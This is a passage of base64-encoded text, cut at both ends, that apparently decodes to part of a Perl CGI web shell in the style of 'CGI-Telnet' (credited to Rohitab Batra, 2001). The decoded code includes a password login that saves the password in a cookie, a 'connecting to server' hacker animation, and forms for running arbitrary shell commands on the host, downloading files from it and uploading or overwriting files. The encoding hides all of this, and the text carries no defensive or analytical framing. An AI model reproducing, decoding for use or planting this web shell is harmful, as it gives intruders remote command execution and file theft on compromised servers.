T4KPGZvbnQgaWQ9IlJlc3BvbnNlRGF0YSIgY29sb3I9IiNmZjk5Y2MiID4KRU5ECn0KCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBQcmludHMgdGhlIExvZ2luIFNjcmVlbgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBQcmludExvZ2luU2NyZWVuCnsKCglwcmludCA8PEVORDsKPHByZT48c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCI+ClR5cGluZ1RleHQgPSBmdW5jdGlvbihlbGVtZW50LCBpbnRlcnZhbCwgY3Vyc29yLCBmaW5pc2hlZENhbGxiYWNrKSB7CiAgaWYoKHR5cGVvZiBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCA9PSAidW5kZWZpbmVkIikgfHwgKHR5cGVvZiBlbGVtZW50LmlubmVySFRNTCA9PSAidW5kZWZpbmVkIikpIHsKICAgIHRoaXMucnVubmluZyA9IHRydWU7CS8vIE5ldmVyIHJ1bi4KICAgIHJldHVybjsKICB9CiAgdGhpcy5lbGVtZW50ID0gZWxlbWVudDsKICB0aGlzLmZpbmlzaGVkQ2FsbGJhY2sgPSAoZmluaXNoZWRDYWxsYmFjayA/IGZpbmlzaGVkQ2FsbGJhY2sgOiBmdW5jdGlvbigpIHsgcmV0dXJuOyB9KTsKICB0aGlzLmludGVydmFsID0gKHR5cGVvZiBpbnRlcnZhbCA9PSAidW5kZWZpbmVkIiA/IDEwMCA6IGludGVydmFsKTsKICB0aGlzLm9yaWdUZXh0ID0gdGhpcy5lbGVtZW50LmlubmVySFRNTDsKICB0aGlzLnVucGFyc2VkT3JpZ1RleHQgPSB0aGlzLm9yaWdUZXh0OwogIHRoaXMuY3Vyc29yID0gKGN1cnNvciA/IGN1cnNvciA6ICIiKTsKICB0aGlzLmN1cnJlbnRUZXh0ID0gIiI7CiAgdGhpcy5jdXJyZW50Q2hhciA9IDA7CiAgdGhpcy5lbGVtZW50LnR5cGluZ1RleHQgPSB0aGlzOwogIGlmKHRoaXMuZWxlbWVudC5pZCA9PSAiIikgdGhpcy5lbGVtZW50LmlkID0gInR5cGluZ3RleHQiICsgVHlwaW5nVGV4dC5jdXJyZW50SW5kZXgrKzsKICBUeXBpbmdUZXh0LmFsbC5wdXNoKHRoaXMpOwogIHRoaXMucnVubmluZyA9IGZhbHNlOwogIHRoaXMuaW5UYWcgPSBmYWxzZTsKICB0aGlzLnRhZ0J1ZmZlciA9ICIiOwogIHRoaXMuaW5IVE1MRW50aXR5ID0gZmFsc2U7CiAgdGhpcy5IVE1MRW50aXR5QnVmZmVyID0gIiI7Cn0KVHlwaW5nVGV4dC5hbGwgPSBuZXcgQXJyYXkoKTsKVHlwaW5nVGV4dC5jdXJyZW50SW5kZXggPSAwOwpUeXBpbmdUZXh0LnJ1bkFsbCA9IGZ1bmN0aW9uKCkgewogIGZvcih2YXIgaSA9IDA7IGkgPCBUeXBpbmdUZXh0LmFsbC5sZW5ndGg7IGkrKykgVHlwaW5nVGV4dC5hbGxbaV0ucnVuKCk7Cn0KVHlwaW5nVGV4dC5wcm90b3R5cGUucnVuID0gZnVuY3Rpb24oKSB7CiAgaWYodGhpcy5ydW5uaW5nKSByZXR1cm47CiAgaWYodHlwZW9mIHRoaXMub3JpZ1RleHQgPT0gInVuZGVmaW5lZCIpIHsKICAgIHNldFRpbWVvdXQoImRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCciICsgdGhpcy5lbGVtZW50LmlkICsgIicpLnR5cGluZ1RleHQucnVuKCkiLCB0aGlzLmludGVydmFsKTsJLy8gV2UgaGF2ZW4ndCBmaW5pc2hlZCBsb2FkaW5nIHlldC4gIEhhdmUgcGF0aWVuY2UuCiAgICByZXR1cm47CiAgfQogIGlmKHRoaXMuY3VycmVudFRleHQgPT0gIiIpIHRoaXMuZWxlbWVudC5pbm5lckhUTUwgPSAiIjsKLy8gIHRoaXMub3JpZ1RleHQgPSB0aGlzLm9yaWdUZXh0LnJlcGxhY2UoLzwoW148XSkqPi8sICIiKTsgICAgIC8vIFN0cmlwIEhUTUwgZnJvbSB0ZXh0LgogIGlmKHRoaXMuY3VycmVudENoYXIgPCB0aGlzLm9yaWdUZXh0Lmxlbmd0aCkgewogICAgaWYodGhpcy5vcmlnVGV4dC5jaGFyQXQodGhpcy5jdXJyZW50Q2hhcikgPT0gIjwiICYmICF0aGlzLmluVGFnKSB7CiAgICAgIHRoaXMudGFnQnVmZmVyID0gIjwiOwogICAgICB0aGlzLmluVGFnID0gdHJ1ZTsKICAgICAgdGhpcy5jdXJyZW50Q2hhcisrOwogICAgICB0aGlzLnJ1bigpOwogICAgICByZXR1cm47CiAgICB9IGVsc2UgaWYodGhpcy5vcmlnVGV4dC5jaGFyQXQodGhpcy5jdXJyZW50Q2hhcikgPT0gIj4iICYmIHRoaXMuaW5UYWcpIHsKICAgICAgdGhpcy50YWdCdWZmZXIgKz0gIj4iOwogICAgICB0aGlzLmluVGFnID0gZmFsc2U7CiAgICAgIHRoaXMuY3VycmVudFRleHQgKz0gdGhpcy50YWdCdWZmZXI7CiAgICAgIHRoaXMuY3VycmVudENoYXIrKzsKICAgICAgdGhpcy5ydW4oKTsKICAgICAgcmV0dXJuOwogICAgfSBlbHNlIGlmKHRoaXMuaW5UYWcpIHsKICAgICAgdGhpcy50YWdCdWZmZXIgKz0gdGhpcy5vcmlnVGV4dC5jaGFyQXQodGhpcy5jdXJyZW50Q2hhcik7CiAgICAgIHRoaXMuY3VycmVudENoYXIrKzsKICAgICAgdGhpcy5ydW4oKTsKICAgICAgcmV0dXJuOwogICAgfSBlbHNlIGlmKHRoaXMub3JpZ1RleHQuY2hhckF0KHRoaXMuY3VycmVudENoYXIpID09ICImIiAmJiAhdGhpcy5pbkhUTUxFbnRpdHkpIHsKICAgICAgdGhpcy5IVE1MRW50aXR5QnVmZmVyID0gIiYiOwogICAgICB0aGlzLmluSFRNTEVudGl0eSA9IHRydWU7CiAgICAgIHRoaXMuY3VycmVudENoYXIrKzsKICAgICAgdGhpcy5ydW4oKTsKICAgICAgcmV0dXJuOwogICAgfSBlbHNlIGlmKHRoaXMub3JpZ1RleHQuY2hhckF0KHRoaXMuY3VycmVudENoYXIpID09ICI7IiAmJiB0aGlzLmluSFRNTEVudGl0eSkgewogICAgICB0aGlzLkhUTUxFbnRpdHlCdWZmZXIgKz0gIjsiOwogICAgICB0aGlzLmluSFRNTEVudGl0eSA9IGZhbHNlOwogICAgICB0aGlzLmN1cnJlbnRUZXh0ICs9IHRoaXMuSFRNTEVudGl0eUJ1ZmZlcjsKICAgICAgdGhpcy5jdXJyZW50Q2hhcisrOwogICAgICB0aGlzLnJ1bigpOwogICAgICByZXR1cm47CiAgICB9IGVsc2UgaWYodGhpcy5pbkhUTUxFbnRpdHkpIHsKICAgICAgdGhpcy5IVE1MRW50aXR5QnVmZmVyICs9IHRoaXMub3JpZ1RleHQuY2hhckF0KHRoaXMuY3VycmVudENoYXIpOwogICAgICB0aGlzLmN1cnJlbnRDaGFyKys7CiAgICAgIHRoaXMucnVuKCk7CiAgICAgIHJldHVybjsKICAgIH0gZWxzZSB7CiAgICAgIHRoaXMuY3VycmVudFRleHQgKz0gdGhpcy5vcmlnVGV4dC5jaGFyQXQodGhpcy5jdXJyZW50Q2hhcik7CiAgICB9CiAgICB0aGlzLmVsZW1lbnQuaW5uZXJIVE1MID0gdGhpcy5jdXJyZW50VGV4dDsKICAgIHRoaXMuZWxlbWVudC5pbm5lckhUTUwgKz0gKHRoaXMuY3VycmVudENoYXIgPCB0aGlzLm9yaWdUZXh0Lmxlbmd0aCAtIDEgPyAodHlwZW9mIHRoaXMuY3Vyc29yID09ICJmdW5jdGlvbiIgPyB0aGlzLmN1cnNvcih0aGlzLmN1cnJlbnRUZXh0KSA6IHRoaXMuY3Vyc29yKSA6ICIiKTsKICAgIHRoaXMuY3VycmVudENoYXIrKzsKICAgIHNldFRpbWVvdXQoImRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCciICsgdGhpcy5lbGVtZW50LmlkICsgIicpLnR5cGluZ1RleHQucnVuKCkiLCB0aGlzLmludGVydmFsKTsKICB9IGVsc2UgewoJdGhpcy5jdXJyZW50VGV4dCA9ICIiOwoJdGhpcy5jdXJyZW50Q2hhciA9IDA7CiAgICAgICAgdGhpcy5ydW5uaW5nID0gZmFsc2U7CiAgICAgICAgdGhpcy5maW5pc2hlZENhbGxiYWNrKCk7CiAgfQp9Cjwvc2NyaXB0Pgo8L3ByZT4KCjxmb250IHN0eWxlPSJmb250OiAxNXB0IFZlcmRhbmE7IGNvbG9yOiB5ZWxsb3c7Ij5Db3B5cmlnaHQgKEMpIDIwMDEgUm9oaXRhYiBCYXRyYSA8L2ZvbnQ+PGJyPjxicj4KPHRhYmxlIGFsaWduPSJjZW50ZXIiIGJvcmRlcj0iMSIgd2lkdGg9IjYwMCIgaGVpZ2g+Cjx0Ym9keT48dHI+Cjx0ZCB2YWxpZ249InRvcCIgYmFja2dyb3VuZD0iaHR0cDovL2RsLmRyb3Bib3guY29tL3UvMTA4NjAwNTEvaW1hZ2VzL21hdHJhbi5naWYiPjxwIGlkPSJoYWNrIiBzdHlsZT0ibWFyZ2luLWxlZnQ6IDNweDsiPgo8Zm9udCBjb2xvcj0iIzAwOTkwMCI+IFBsZWFzZSBXYWl0IC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC48L2ZvbnQ+IDxicj4KCjxmb250IGNvbG9yPSIjMDA5OTAwIj4gVHJ5aW5nIGNvbm5lY3QgdG8gU2VydmVyIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC48L2ZvbnQ+PGJyPgo8Zm9udCBjb2xvcj0iI0YwMDAwMCI+PGZvbnQgY29sb3I9IiNGRkYwMDAiPn5cJDwvZm9udD4gQ29ubmVjdGVkICEgPC9mb250Pjxicj4KPGZvbnQgY29sb3I9IiMwMDk5MDAiPjxmb250IGNvbG9yPSIjRkZGMDAwIj4kU2VydmVyTmFtZX48L2ZvbnQ+IENoZWNraW5nIFNlcnZlciAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuPC9mb250PiA8YnI+Cgo8Zm9udCBjb2xvcj0iIzAwOTkwMCI+PGZvbnQgY29sb3I9IiNGRkYwMDAiPiRTZXJ2ZXJOYW1lfjwvZm9udD4gVHJ5aW5nIGNvbm5lY3QgdG8gQ29tbWFuZCAuIC4gLiAuIC4gLiAuIC4gLiAuIC48L2ZvbnQ+PGJyPgoKPGZvbnQgY29sb3I9IiNGMDAwMDAiPjxmb250IGNvbG9yPSIjRkZGMDAwIj4kU2VydmVyTmFtZX48L2ZvbnQ+XCQgQ29ubmVjdGVkIENvbW1hbmQhIDwvZm9udD48YnI+Cjxmb250IGNvbG9yPSIjMDA5OTAwIj48Zm9udCBjb2xvcj0iI0ZGRjAwMCI+JFNlcnZlck5hbWV+PGZvbnQgY29sb3I9IiNGMDAwMDAiPlwkPC9mb250PjwvZm9udD4gT0shIFlvdSBjYW4ga2lsbCBpdCE8L2ZvbnQ+CjwvdHI+CjwvdGJvZHk+PC90YWJsZT4KPGJyPgoKPHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiPgpuZXcgVHlwaW5nVGV4dChkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiaGFjayIpLCAzMCwgZnVuY3Rpb24oaSl7IHZhciBhciA9IG5ldyBBcnJheSgiXyIsIiIpOyByZXR1cm4gIiAiICsgYXJbaS5sZW5ndGggJSBhci5sZW5ndGhdOyB9KTsKVHlwaW5nVGV4dC5ydW5BbGwoKTsKCjwvc2NyaXB0PgpFTkQKfQoKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIEFkZCBodG1sIHNwZWNpYWwgY2hhcnMKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpzdWIgSHRtbFNwZWNpYWxDaGFycygkKXsKCW15ICR0ZXh0ID0gc2hpZnQ7CgkkdGV4dCA9fiBzLyYvJmFtcDsvZzsKCSR0ZXh0ID1+IHMvIi8mcXVvdDsvZzsKCSR0ZXh0ID1+IHMvJy8mIzAzOTsvZzsKCSR0ZXh0ID1+IHMvPC8mbHQ7L2c7CgkkdGV4dCA9fiBzLz4vJmd0Oy9nOwoJcmV0dXJuICR0ZXh0Owp9CiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBBZGQgbGluayBmb3IgZGlyZWN0b3J5CiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIEFkZExpbmtEaXIoJCkKewoJbXkgJGFjPXNoaWZ0OwoJbXkgQGRpcj0oKTsKCWlmKCRXaW5OVCkKCXsKCQlAZGlyPXNwbGl0KC9cXC8sJEN1cnJlbnREaXIpOwoJfWVsc2UKCXsKCQlAZGlyPXNwbGl0KCIvIiwmdHJpbSgkQ3VycmVudERpcikpOwoJfQoJbXkgJHBhdGg9IiI7CglteSAkcmVzdWx0PSIiOwoJZm9yZWFjaCAoQGRpcikKCXsKCQkkcGF0aCAuPSAkXy4kUGF0aFNlcDsKCQkkcmVzdWx0Lj0iPGEgaHJlZj0nP2E9Ii4kYWMuIiZkPSIuJHBhdGguIic+Ii4kXy4kUGF0aFNlcC4iPC9hPiI7Cgl9CglyZXR1cm4gJHJlc3VsdDsKfQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgUHJpbnRzIHRoZSBtZXNzYWdlIHRoYXQgaW5mb3JtcyB0aGUgdXNlciBvZiBhIGZhaWxlZCBsb2dpbgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBQcmludExvZ2luRmFpbGVkTWVzc2FnZQp7CglwcmludCA8PEVORDsKPGJyPkxvZ2luIDogQWRtaW5pc3RyYXRvcjxicj4KClBhc3N3b3JkOjxicj4KTG9naW4gaW5jb3JyZWN0PGJyPjxicj4KRU5ECn0KCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBQcmludHMgdGhlIEhUTUwgZm9ybSBmb3IgbG9nZ2luZyBpbgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBQcmludExvZ2luRm9ybQp7CglwcmludCA8PEVORDsKPGZvcm0gbmFtZT0iZiIgbWV0aG9kPSJQT1NUIiBhY3Rpb249IiRTY3JpcHRMb2NhdGlvbiI+CjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImEiIHZhbHVlPSJsb2dpbiI+CkxvZ2luIDogQWRtaW5pc3RyYXRvcjxicj4KUGFzc3dvcmQ6PGlucHV0IHR5cGU9InBhc3N3b3JkIiBuYW1lPSJwIj4KPGlucHV0IGNsYXNzPSJzdWJtaXQiIHR5cGU9InN1Ym1pdCIgdmFsdWU9IkVudGVyIj4KPC9mb3JtPgpFTkQKfQoKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIFByaW50cyB0aGUgZm9vdGVyIGZvciB0aGUgSFRNTCBQYWdlCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIFByaW50UGFnZUZvb3Rlcgp7CglwcmludCAiPGJyPjxmb250IGNvbG9yPXJlZD5vLS0tWyAgPGZvbnQgY29sb3I9I2ZmOTkwMD5FZGl0IGJ5ICRFZGl0UGVyc2lvbiA8L2ZvbnQ+ICBdLS0tbzwvZm9udD48L2NvZGU+PC9jZW50ZXI+PC9ib2R5PjwvaHRtbD4iOwp9CgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgUmV0cmVpdmVzIHRoZSB2YWx1ZXMgb2YgYWxsIGNvb2tpZXMuIFRoZSBjb29raWVzIGNhbiBiZSBhY2Nlc3NlcyB1c2luZyB0aGUKIyB2YXJpYWJsZSAkQ29va2llc3snJ30KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpzdWIgR2V0Q29va2llcwp7CglAaHR0cGNvb2tpZXMgPSBzcGxpdCgvOyAvLCRFTlZ7J0hUVFBfQ09PS0lFJ30pOwoJZm9yZWFjaCAkY29va2llKEBodHRwY29va2llcykKCXsKCQkoJGlkLCAkdmFsKSA9IHNwbGl0KC89LywgJGNvb2tpZSk7CgkJJENvb2tpZXN7JGlkfSA9ICR2YWw7Cgl9Cn0KCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBQcmludHMgdGhlIHNjcmVlbiB3aGVuIHRoZSB1c2VyIGxvZ3Mgb3V0CiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIFByaW50TG9nb3V0U2NyZWVuCnsKCXByaW50ICJDb25uZWN0aW9uIGNsb3NlZCBieSBmb3JlaWduIGhvc3QuPGJyPjxicj4iOwp9CgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgTG9ncyBvdXQgdGhlIHVzZXIgYW5kIGFsbG93cyB0aGUgdXNlciB0byBsb2dpbiBhZ2FpbgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBQZXJmb3JtTG9nb3V0CnsKCXByaW50ICJTZXQtQ29va2llOiBTQVZFRFBXRD07XG4iOyAjIHJlbW92ZSBwYXNzd29yZCBjb29raWUKCSZQcmludFBhZ2VIZWFkZXIoInAiKTsKCSZQcmludExvZ291dFNjcmVlbjsKCgkmUHJpbnRMb2dpblNjcmVlbjsKCSZQcmludExvZ2luRm9ybTsKCSZQcmludFBhZ2VGb290ZXI7CglleGl0Owp9CgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgVGhpcyBmdW5jdGlvbiBpcyBjYWxsZWQgdG8gbG9naW4gdGhlIHVzZXIuIElmIHRoZSBwYXNzd29yZCBtYXRjaGVzLCBpdAojIGRpc3BsYXlzIGEgcGFnZSB0aGF0IGFsbG93cyB0aGUgdXNlciB0byBydW4gY29tbWFuZHMuIElmIHRoZSBwYXNzd29yZCBkb2Vucyd0CiMgbWF0Y2ggb3IgaWYgbm8gcGFzc3dvcmQgaXMgZW50ZXJlZCwgaXQgZGlzcGxheXMgYSBmb3JtIHRoYXQgYWxsb3dzIHRoZSB1c2VyCiMgdG8gbG9naW4KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpzdWIgUGVyZm9ybUxvZ2luIAp7CglpZigkTG9naW5QYXNzd29yZCBlcSAkUGFzc3dvcmQpICMgcGFzc3dvcmQgbWF0Y2hlZAoJewoJCXByaW50ICJTZXQtQ29va2llOiBTQVZFRFBXRD0kTG9naW5QYXNzd29yZDtcbiI7CgkJJlByaW50UGFnZUhlYWRlcjsKCQlwcmludCAmTGlzdERpcjsKCX0KCWVsc2UgIyBwYXNzd29yZCBkaWRuJ3QgbWF0Y2gKCXsKCQkmUHJpbnRQYWdlSGVhZGVyKCJwIik7CgkJJlByaW50TG9naW5TY3JlZW47CgkJaWYoJExvZ2luUGFzc3dvcmQgbmUgIiIpICMgc29tZSBwYXNzd29yZCB3YXMgZW50ZXJlZAoJCXsKCQkJJlByaW50TG9naW5GYWlsZWRNZXNzYWdlOwoKCQl9CgkJJlByaW50TG9naW5Gb3JtOwoJCSZQcmludFBhZ2VGb290ZXI7CgkJZXhpdDsKCX0KfQoKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIFByaW50cyB0aGUgSFRNTCBmb3JtIHRoYXQgYWxsb3dzIHRoZSB1c2VyIHRvIGVudGVyIGNvbW1hbmRzCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIFByaW50Q29tbWFuZExpbmVJbnB1dEZvcm0KewoJbXkgJGRpcj0gIjxzcGFuIHN0eWxlPSdmb250OiAxMXB0IFZlcmRhbmE7IGZvbnQtd2VpZ2h0OiBib2xkOyc+Ii4mQWRkTGlua0RpcigiY29tbWFuZCIpLiI8L3NwYW4+IjsKCSRQcm9tcHQgPSAkV2luTlQgPyAiJGRpciA+ICIgOiAiPGZvbnQgY29sb3I9JyM2NmZmNjYnPlthZG1pblxAJFNlcnZlck5hbWUgJGRpcl1cJDwvZm9udD4gIjsKCXJldHVybiA8PEVORDsKPGZvcm0gbmFtZT0iZiIgbWV0aG9kPSJQT1NUIiBhY3Rpb249IiRTY3JpcHRMb2NhdGlvbiI+Cgo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJhIiB2YWx1ZT0iY29tbWFuZCI+Cgo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJkIiB2YWx1ZT0iJEN1cnJlbnREaXIiPgokUHJvbXB0CjxpbnB1dCB0eXBlPSJ0ZXh0IiBzaXplPSI1MCIgbmFtZT0iYyI+CjxpbnB1dCBjbGFzcz0ic3VibWl0InR5cGU9InN1Ym1pdCIgdmFsdWU9IkVudGVyIj4KPC9mb3JtPgpFTkQKfQoKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIFByaW50cyB0aGUgSFRNTCBmb3JtIHRoYXQgYWxsb3dzIHRoZSB1c2VyIHRvIGRvd25sb2FkIGZpbGVzCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIFByaW50RmlsZURvd25sb2FkRm9ybQp7CglteSAkZGlyID0gJkFkZExpbmtEaXIoImRvd25sb2FkIik7IAoJJFByb21wdCA9ICRXaW5OVCA/ICIkZGlyID4gIiA6ICJbYWRtaW5cQCRTZXJ2ZXJOYW1lICRkaXJdXCQgIjsKCXJldHVybiA8PEVORDsKPGZvcm0gbmFtZT0iZiIgbWV0aG9kPSJQT1NUIiBhY3Rpb249IiRTY3JpcHRMb2NhdGlvbiI+CjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImQiIHZhbHVlPSIkQ3VycmVudERpciI+CjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImEiIHZhbHVlPSJkb3dubG9hZCI+CiRQcm9tcHQgZG93bmxvYWQ8YnI+PGJyPgpGaWxlbmFtZTogPGlucHV0IGNsYXNzPSJmaWxlIiB0eXBlPSJ0ZXh0IiBuYW1lPSJmIiBzaXplPSIzNSI+PGJyPjxicj4KRG93bmxvYWQ6IDxpbnB1dCBjbGFzcz0ic3VibWl0IiB0eXBlPSJzdWJtaXQiIHZhbHVlPSJCZWdpbiI+Cgo8L2Zvcm0+CkVORAp9CgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgUHJpbnRzIHRoZSBIVE1MIGZvcm0gdGhhdCBhbGxvd3MgdGhlIHVzZXIgdG8gdXBsb2FkIGZpbGVzCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIFByaW50RmlsZVVwbG9hZEZvcm0KewoJbXkgJGRpcj0gJkFkZExpbmtEaXIoInVwbG9hZCIpOwoJJFByb21wdCA9ICRXaW5OVCA/ICIkZGlyID4gIiA6ICJbYWRtaW5cQCRTZXJ2ZXJOYW1lICRkaXJdXCQgIjsKCXJldHVybiA8PEVORDsKPGZvcm0gbmFtZT0iZiIgZW5jdHlwZT0ibXVsdGlwYXJ0L2Zvcm0tZGF0YSIgbWV0aG9kPSJQT1NUIiBhY3Rpb249IiRTY3JpcHRMb2NhdGlvbiI+CiRQcm9tcHQgdXBsb2FkPGJyPjxicj4KRmlsZW5hbWU6IDxpbnB1dCBjbGFzcz0iZmlsZSIgdHlwZT0iZmlsZSIgbmFtZT0iZiIgc2l6ZT0iMzUiPjxicj48YnI+Ck9wdGlvbnM6ICZuYnNwOzxpbnB1dCB0eXBlPSJjaGVja2JveCIgbmFtZT0ibyIgaWQ9InVwIiB2YWx1ZT0ib3ZlcndyaXRlIj4KPGxhYmVsIGZvcj0idXAiPk92ZXJ3cml0ZSBpZiBpdCBFeGlzdHM8L2xhYmVsPjxicj48YnI+ClVwbG9hZDombmJzcDsmbmJzcDsmbmJzcDs8aW5wdXQgY2xhc3M9InN1Ym1pdCIgdHlwZT0ic3VibWl0IiB2YWx1ZT0iQmVnaW4iPgo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJkIiB2YWx1ZT0iJEN1cnJlbnREaXIiPgo8aW5wdXQgY2xhc3M9InN1Ym1pdCIgdHlwZT0iaGlkZGVuIiBuYW1lPSJhIiB2YWx1ZT0idXBsb2FkIj4KCjwvZm9ybT4KCkVORAp9CgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgVGhpcyBmdW5jdGlvbiBpcyBjYWxsZWQgd2hlbiB0aGUgdGltZW91dCBmb3IgYSBjb21tYW5kIGV4cGlyZXMuIFdlIG5lZWQgdG8KIyB0ZXJtaW5hdGUgdGhlIHNjcmlwdCBpbW1lZGlhdGVseS4gVGhpcyBmdW5jdGlvbiBpcyB2YWxpZCBvbmx5IG9uIFVuaXguIEl0IGlzCiMgbmV2ZXIgY2FsbGVkIHdoZW4gdGhlIHNjcmlwdCBpcyBydW5uaW5nIG9uIE5ULgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBDb21tYW5kVGltZW91dAp7CglpZighJFdpbk5UKQoJewoJCWFsYXJtKDApOwoJCXJldHVybiA8PEVORDsKPC90ZXh0YXJlYT4KPGJyPjxmb250IGNvbG9yPXllbGxvdz4KQ29tbWFuZCBleGNlZWRlZCBtYXhpbXVtIHRpbWUgb2YgJENvbW1hbmRUaW1lb3V0RHVyYXRpb24gc2Vjb25kKHMpLjwvZm9udD4KPGJyPjxmb250IHNpemU9